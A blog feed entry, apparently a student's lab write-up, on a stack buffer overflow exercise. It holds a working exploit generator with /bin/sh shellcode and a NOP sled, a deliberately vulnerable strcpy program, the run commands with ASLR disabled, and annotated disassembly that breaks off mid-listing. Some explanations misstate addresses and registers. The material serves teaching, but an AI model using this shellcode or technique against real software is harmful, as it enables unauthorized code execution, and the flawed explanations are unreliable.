<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>FireKnight-HJ</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-04-12T03:25:15.756Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>fireknight</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Buffer Overflow Attack ，part2：模拟实验</title>
    <link href="http://example.com/2022/04/12/Buffer-Overflow-Attack-%EF%BC%8Cpart2%EF%BC%9A%E6%A8%A1%E6%8B%9F%E5%AE%9E%E9%AA%8C/"/>
    <id>http://example.com/2022/04/12/Buffer-Overflow-Attack-%EF%BC%8Cpart2%EF%BC%9A%E6%A8%A1%E6%8B%9F%E5%AE%9E%E9%AA%8C/</id>
    <published>2022-04-11T17:10:53.000Z</published>
    <updated>2022-04-12T03:25:15.756Z</updated>
    
    <content type="html"><![CDATA[<p>Buffer Overflow Attack ，part2：模拟实验</p><span id="more"></span><h3 id="1-实验步骤："><a href="#1-实验步骤：" class="headerlink" title="1. 实验步骤："></a>1. 实验步骤：</h3><h4 id="1-1-运行-exploit-程序，生成-badfile"><a href="#1-1-运行-exploit-程序，生成-badfile" class="headerlink" title="1.1 运行 exploit 程序，生成 badfile"></a>1.1 运行 exploit 程序，生成 badfile</h4><p>按照 如下命令行，运行 exploit 程序，生成 badfile。利用 xxd 分析 badfile，同时分析 exploit.c 源代码，理解并解释为什么程序能够生成 badfile 的内容。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1. make</span><br><span class="line">2. setarch i386 -R ./exploit</span><br><span class="line">   (generate &quot;badfile&quot; while ASLR disabled)</span><br><span class="line">3. xxd badfile</span><br><span class="line">   (to observe the content of &quot;badfile&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(tested on Ubuntu 18.04 64bit, gcc 7.5.0)</span><br></pre></td></tr></table></figure><p>执行<code>xxd badfile</code>后输出结果如下：</p><p><img src="/2022/04/12/Buffer-Overflow-Attack-%EF%BC%8Cpart2%EF%BC%9A%E6%A8%A1%E6%8B%9F%E5%AE%9E%E9%AA%8C/uTools_1649411082559-16494111375821-16497336117841.png" alt="uTools_1649411082559"></p><h4 id="1-2-运行-stack-程序，实施栈溢出利用，观察-shellcode-的执行效果"><a href="#1-2-运行-stack-程序，实施栈溢出利用，观察-shellcode-的执行效果" class="headerlink" title="1.2 运行 stack 程序，实施栈溢出利用，观察 shellcode 的执行效果"></a>1.2 运行 stack 程序，实施栈溢出利用，观察 shellcode 的执行效果</h4><p>执行如下命令<code>-R</code>代表禁止使用地址随机化（这种编译器措施可以一定程度上防范缓冲区溢出攻击），这是我们程序能够顺利进行的必要条件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4. setarch i386 -R ./stack</span><br><span class="line">   (shell code injected onto the stack and executed)</span><br></pre></td></tr></table></figure><p>运行<code>setarch i386 -R ./stack</code>命令，得到结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ setarch i386 -R ./stack</span><br><span class="line">str addr (0xffffcfd7)</span><br><span class="line">buffer addr (0xffffcf98)</span><br><span class="line">$</span><br><span class="line">$ </span><br></pre></td></tr></table></figure><p>运行截图：</p><p><img src="/2022/04/12/Buffer-Overflow-Attack-%EF%BC%8Cpart2%EF%BC%9A%E6%A8%A1%E6%8B%9F%E5%AE%9E%E9%AA%8C/uTools_1649414928010-16497336117842.png" alt="uTools_1649414928010"></p><p>我们发现我们通过运行stack这个程序成功进入到了shell中，我们的攻击成功了。</p><h3 id="2-攻击执行过程详解"><a href="#2-攻击执行过程详解" class="headerlink" title="2. 攻击执行过程详解"></a>2. 攻击执行过程详解</h3><h4 id="2-1-badfile生成"><a href="#2-1-badfile生成" class="headerlink" title="2.1 badfile生成"></a>2.1 badfile生成</h4><p>exploit.c程序代码及详解如下：</p><ul><li>shellcode[]数组中存储了我们利用buffer overflow漏洞想要执行的恶意代码</li><li>fillBuffer函数将shellcode[]数组中的恶意代码放在了函数fillBuffer的最后并在buffer[BUFFER_SIZE-1] 处填入 ‘\0’，并将buffer[]数组中前25*4个字节的内容填充满了<em>我们想要让程序跳转到的恶意代码所在的目标位置的内存地址</em>，这个位置可以是任何一个NOP所在位置，或者恶意程序开头所在位置。</li><li>main()函数中，首先将buffer[Buffer_Size]数组中填满NOP（0x90），之后调用fillBuffer(buffer)函数将恶意代码和跳转地址填入，最后将buffer[]数组的内容写入badfile中。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* exploit.c */</span></span><br><span class="line"><span class="comment">/* A program that creates a file &quot;badfile&quot; containing code for launching shell */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFFER_SIZE 517 <span class="comment">// Represent the size of the buffer</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OFFSET 400 <span class="comment">// Represent the offset from buffer</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//shellcode[]数组中存储了我们利用buffer overflow漏洞想要执行的恶意代码</span></span><br><span class="line"><span class="keyword">char</span> shellcode[] =</span><br><span class="line">  <span class="string">&quot;\x31\xc0&quot;</span></span><br><span class="line">  <span class="string">&quot;\x50&quot;</span></span><br><span class="line">  <span class="string">&quot;\x68&quot;</span><span class="string">&quot;//sh&quot;</span></span><br><span class="line">  <span class="string">&quot;\x68&quot;</span><span class="string">&quot;/bin&quot;</span></span><br><span class="line">  <span class="string">&quot;\x89\xe3&quot;</span></span><br><span class="line">  <span class="string">&quot;\x50&quot;</span></span><br><span class="line">  <span class="string">&quot;\x53&quot;</span></span><br><span class="line">  <span class="string">&quot;\x89\xe1&quot;</span></span><br><span class="line">  <span class="string">&quot;\x99&quot;</span></span><br><span class="line">  <span class="string">&quot;\xb0\x0b&quot;</span></span><br><span class="line">  <span class="string">&quot;\xcd\x80&quot;</span></span><br><span class="line">;</span><br><span class="line"><span class="comment">//fillBuffer函数将shellcode[]数组中的恶意代码放在了函数fillBuffer的最后</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fillBuffer</span><span class="params">(<span class="keyword">char</span> buffer[BUFFER_SIZE])</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Get the size of the shellcode</span></span><br><span class="line">  <span class="keyword">int</span> shellcodeSize = <span class="keyword">sizeof</span>(shellcode);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Represent an estimate return address that will eventually allow shellcode to be executed</span></span><br><span class="line">  <span class="comment">// by using the address of the buffer and an offset value (400 bytes after the buffer in this case)</span></span><br><span class="line">  <span class="keyword">long</span> *returnAddress = (<span class="keyword">long</span> *) (buffer+OFFSET);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Get a long integer pointer of the buffer to reference each 4-bytes hexadecimal in a stack memory address</span></span><br><span class="line">  <span class="keyword">long</span> *bufferPtr = (<span class="keyword">long</span> *) buffer;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Represent index for the &quot;for&quot; loop</span></span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Get the starting index of the null-terminated shellcode in the buffer</span></span><br><span class="line">  <span class="comment">// (i.e. null-terminated shellcode is inserted at the end of the buffer)</span></span><br><span class="line">  <span class="keyword">int</span> shellcodeStartIndex = (BUFFER_SIZE-(shellcodeSize+<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Represent counter for the shellcode</span></span><br><span class="line">  <span class="keyword">int</span> shellcodeCounter = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Loop 25 times (each time modifying the 4-bytes hexadecimal in the stack memory address starting from the buffer)</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">25</span>; i++) &#123;</span><br><span class="line">    *bufferPtr = (<span class="keyword">long</span>) returnAddress; <span class="comment">// Assign the estimate return address to a 4-bytes hexadecimal in the stack memory address</span></span><br><span class="line">    bufferPtr++; <span class="comment">// Go to the next 4-bytes hexadecimal in the stack memory address (because long integer is 4-bytes portion)</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Insert shellcode (without null-termination) at the end of the buffer</span></span><br><span class="line">  <span class="keyword">for</span> (i = shellcodeStartIndex; i &lt; (BUFFER_SIZE<span class="number">-1</span>); i++) &#123;</span><br><span class="line">    buffer[i] = shellcode[shellcodeCounter];</span><br><span class="line">    shellcodeCounter++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Null-terminate the shellcode</span></span><br><span class="line">  buffer[BUFFER_SIZE<span class="number">-1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buffer[BUFFER_SIZE];</span><br><span class="line"><span class="comment">//printf(&quot;buffer addr (%p)\n&quot;, buffer);</span></span><br><span class="line">  FILE *badfile;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Initialize buffer with 0x90 (NOP instruction) */</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;buffer, <span class="number">0x90</span>, BUFFER_SIZE);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* You need to fill the buffer with appropriate contents here */</span></span><br><span class="line">  fillBuffer(buffer);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Save the contents to the file &quot;badfile&quot; */</span></span><br><span class="line">  badfile = fopen(<span class="string">&quot;./badfile&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">  fwrite(buffer, BUFFER_SIZE, <span class="number">1</span>, badfile);</span><br><span class="line">  fclose(badfile);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们观察生成的badfile结构：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">lyq@lyq-virtual-machine:~/Desktop/hw1_cp$ xxd badfile</span><br><span class="line">00000000: 67d1 ffff 67d1 ffff 67d1 ffff 67d1 ffff  g...g...g...g...</span><br><span class="line">00000010: 67d1 ffff 67d1 ffff 67d1 ffff 67d1 ffff  g...g...g...g...</span><br><span class="line">00000020: 67d1 ffff 67d1 ffff 67d1 ffff 67d1 ffff  g...g...g...g...</span><br><span class="line">00000030: 67d1 ffff 67d1 ffff 67d1 ffff 67d1 ffff  g...g...g...g...</span><br><span class="line">00000040: 67d1 ffff 67d1 ffff 67d1 ffff 67d1 ffff  g...g...g...g...</span><br><span class="line">00000050: 67d1 ffff 67d1 ffff 67d1 ffff 67d1 ffff  g...g...g...g...</span><br><span class="line">00000060: 67d1 ffff 9090 9090 9090 9090 9090 9090  g...............</span><br><span class="line">00000070: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000080: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000090: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000000a0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000000b0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000000c0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000000d0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000000e0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000000f0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000100: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000110: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000120: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000130: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000140: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000150: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000160: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000170: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000180: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000190: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000001a0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000001b0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000001c0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000001d0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000001e0: 9090 9090 9090 9090 9090 9031 c050 682f  ...........1.Ph/</span><br><span class="line">000001f0: 2f73 6868 2f62 696e 89e3 5053 89e1 99b0  /shh/bin..PS....</span><br><span class="line">00000200: 0bcd 8000 00                             .....</span><br></pre></td></tr></table></figure><p>可以看到：</p><ul><li>badfile的最前面是25个四字节数字：0xffff1d76，这个数字代表我们要覆盖return address的恶意代码地址（或NOP地址）设计填充多个0xffff1d76是为了提高覆盖return address位置的命中率</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00000000: 67d1 ffff 67d1 ffff 67d1 ffff 67d1 ffff  g...g...g...g...</span><br><span class="line">00000010: 67d1 ffff 67d1 ffff 67d1 ffff 67d1 ffff  g...g...g...g...</span><br><span class="line">00000020: 67d1 ffff 67d1 ffff 67d1 ffff 67d1 ffff  g...g...g...g...</span><br><span class="line">00000030: 67d1 ffff 67d1 ffff 67d1 ffff 67d1 ffff  g...g...g...g...</span><br><span class="line">00000040: 67d1 ffff 67d1 ffff 67d1 ffff 67d1 ffff  g...g...g...g...</span><br><span class="line">00000050: 67d1 ffff 67d1 ffff 67d1 ffff 67d1 ffff  g...g...g...g...</span><br><span class="line">00000060: 67d1 ffff 9090 9090 9090 9090 9090 9090  g...............</span><br></pre></td></tr></table></figure><ul><li>在badfile的最后部分是恶意代码和一个’0x0000‘代表’\0’结束符。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">000001e0: 9090 9090 9090 9090 9090 9031 c050 682f  ...........1.Ph/</span><br><span class="line">000001f0: 2f73 6868 2f62 696e 89e3 5053 89e1 99b0  /shh/bin..PS....</span><br><span class="line">00000200: 0bcd 8000 00                             .....</span><br></pre></td></tr></table></figure><ul><li>而中间的内容中填充满了NOP(0x90)，中间设计填充NOP的作用也是为了提高程序跳转到恶意代码的成功率，只要程序可以跳转到任何一个NOP所在位置，或者跳转到恶意程序开始位置，程序都可以执行到我们植入的恶意代码部分。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">00000060: 67d1 ffff 9090 9090 9090 9090 9090 9090  g...............</span><br><span class="line">00000070: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000080: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000090: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000000a0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000000b0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000000c0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000000d0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000000e0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000000f0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000100: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000110: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000120: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000130: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000140: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000150: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000160: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000170: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000180: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000190: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000001a0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000001b0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000001c0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000001d0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000001e0: 9090 9090 9090 9090 9090 9031 c050 682f  ...........1.Ph/</span><br></pre></td></tr></table></figure><h4 id="2-2-stack程序的汇编研究"><a href="#2-2-stack程序的汇编研究" class="headerlink" title="2.2 stack程序的汇编研究"></a>2.2 stack程序的汇编研究</h4><p>stack.c程序如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* stack.c */</span></span><br><span class="line"><span class="comment">/* This program has a buffer overflow vulnerability. */</span></span><br><span class="line"><span class="comment">/* Our task is to exploit this vulnerability */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFFER_SIZE 517 <span class="comment">// Represent the size of the buffer</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bof</span><span class="params">(<span class="keyword">char</span> *str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">24</span>];</span><br><span class="line"><span class="comment">//printf(&quot;buffer addr (%p)\n&quot;, buffer);</span></span><br><span class="line">    <span class="comment">/* The following statement has a buffer overflow problem */</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[BUFFER_SIZE];</span><br><span class="line"><span class="comment">//printf(&quot;str addr (%p)\n&quot;, str);</span></span><br><span class="line">    FILE *badfile;</span><br><span class="line">    badfile = fopen(<span class="string">&quot;badfile&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    fread(str, <span class="keyword">sizeof</span>(<span class="keyword">char</span>), <span class="number">517</span>, badfile);</span><br><span class="line">    bof(str);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Returned Properly\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到bof中定义的buffer[24]数组大小只有24，远小于badfile的大小517，而bof函数中未进行任何的缓冲区越界检查，因此程序存在缓冲区溢出的漏洞。</p><ul><li>我们研究涉及到的主要寄存器：</li></ul><ol><li><p>%ebx: frame pointer寄存器，被调用者保存，指向当前的previous frame pointer在堆栈区的地址</p></li><li><p>%esp: (stack pointer)栈顶指针寄存器，提供堆栈栈顶单元的偏移地址，与rss段寄存器联用，以控制数据进栈和出栈</p></li><li><p>%eax: 存储返回值</p></li></ol><p>程序产生的asm汇编代码很长，我们关系的只有main和bof两部分，这两部分摘录如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">080484eb &lt;bof&gt;:</span><br><span class="line"> 80484eb:55                   push   %ebp;caller的frame pointer入栈</span><br><span class="line"> 80484ec:89 e5                mov    %esp,%ebp;设置新的栈开头指针</span><br><span class="line"> 80484ee:83 ec 28             sub    $0x28,%esp;开辟28栈空间(此时-0x20(%ebp)是bof中buffer[24]数组的首地址)</span><br><span class="line"> 80484f1:83 ec 08             sub    $0x8,%esp</span><br><span class="line"> 80484f4:8d 45 e0             lea    -0x20(%ebp),%eax</span><br><span class="line"> 80484f7:50                   push   %eax</span><br><span class="line"> 80484f8:68 30 86 04 08       push   $0x8048630</span><br><span class="line"> 80484fd:e8 7e fe ff ff       call   8048380 &lt;printf@plt&gt;</span><br><span class="line"> 8048502:83 c4 10             add    $0x10,%esp</span><br><span class="line"> 8048505:83 ec 08             sub    $0x8,%esp;开辟8栈空间(用来存放)</span><br><span class="line"> 8048508:ff 75 08             pushl  0x8(%ebp);ebp+8处的数（即传进去bof的arg：str）压入栈</span><br><span class="line"> ;实际上就是strcpy的arg2： str入栈</span><br><span class="line"> 804850b:8d 45 e0             lea    -0x20(%ebp),%eax</span><br><span class="line"> 804850e:50                   push   %eax ;strcpy的arg1： buffer首地址入栈</span><br><span class="line"> 804850f:e8 8c fe ff ff       call   80483a0 &lt;strcpy@plt&gt; ;调用strcpy</span><br><span class="line"> 8048514:83 c4 10             add    $0x10,%esp</span><br><span class="line"> 8048517:b8 01 00 00 00       mov    $0x1,%eax;返回值是1，存在eax中</span><br><span class="line"> 804851c:c9                   leave  ;leave恢复ebp的值，同时也重新设定栈指针使其指向存储的返回值，好让下一步return时，frame pointer回到正确的位置上</span><br><span class="line"> 804851d:c3                   ret    ;返回caller函数</span><br><span class="line"></span><br><span class="line">0804851e &lt;main&gt;:</span><br><span class="line"> 804851e:8d 4c 24 04          lea    0x4(%esp),%ecx ;ecx = esp+4</span><br><span class="line"> 8048522:83 e4 f0             and    $0xfffffff0,%esp ;取esp的前面3.5个字节(esp最后4bit置0)</span><br><span class="line"> 8048525:ff 71 fc             pushl  -0x4(%ecx) ;在栈中压入ecx-4对应地址的数据</span><br><span class="line"> 8048528:55                   push   %ebp ;frame pointer 帧指针</span><br><span class="line"> 8048529:89 e5                mov    %esp,%ebp ;ebp &lt;= esp</span><br><span class="line"> 804852b:51                   push   %ecx ;ecx入栈，ecx循环操作和字串处理的计数控制；函数调用时的第4个参数</span><br><span class="line"> 804852c:81 ec 14 02 00 00    sub    $0x214,%esp</span><br><span class="line"> 8048532:83 ec 08             sub    $0x8,%esp;开辟了一共214+8的栈空间</span><br><span class="line"> 8048535:8d 85 ef fd ff ff    lea    -0x211(%ebp),%eax ;eax &lt;= ebp-211,此时eax实际上存储了main中str[BUFFER_SIZE]的起始地址</span><br><span class="line"> 804853b:50                   push   %eax ;这句加前一句实际上将str[BUFFER_SIZE]的起始地址作为arg1入栈了</span><br><span class="line"> 804853c:68 42 86 04 08       push   $0x8048642 ;这个地址中存储的应该是&quot;buffer addr (%p)\n&quot;在内存中的位置，作为arg2入栈</span><br><span class="line"> 8048541:e8 3a fe ff ff       call   8048380 &lt;printf@plt&gt; ;调用printf函数，同时将当前的pc压入栈（return address）</span><br><span class="line"> 8048546:83 c4 10             add    $0x10,%esp</span><br><span class="line"> 8048549:83 ec 08             sub    $0x8,%esp</span><br><span 